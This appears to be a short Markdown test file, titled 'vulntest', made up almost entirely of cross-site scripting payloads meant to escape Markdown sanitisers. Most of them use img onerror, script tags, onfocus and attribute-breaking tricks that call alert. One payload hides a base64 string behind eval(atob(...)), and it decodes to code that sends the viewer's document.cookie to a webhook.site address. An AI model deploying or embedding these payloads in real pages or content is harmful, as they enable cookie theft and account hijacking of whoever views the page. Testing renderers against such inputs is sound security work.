# vulntest
md vulntest project

<!-- XSS with regular tags -->
<script>alert(1)</script>
<img src=x onerror=alert(1) />

<div id="1

![](contenteditable/autofocus/onfocus=confirm('qwq')//)">
-----------------------------------------------
<a title="a

<img src=x onerror=alert(1)>">yep</a>
------------------------------------------------
[x](y '<style>')<!--</style><div id="x--><img src=1 onerror=alert(1)>"></div>
----------------------------------------------
[<p x='<style onload=eval(atob(/bG9jYXRpb249YGh0dHBzOi8vd2ViaG9vay5zaXRlL2FiM2IyYjg5LTg1YTktNGU0YS1hNjg0LTUxN2M1ZjQwNmZmMj9mPWArZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSk/.source))>](#'></p>)
----------------------------------------------
`<p x="`<img src=x onerror=alert(1)>"></p>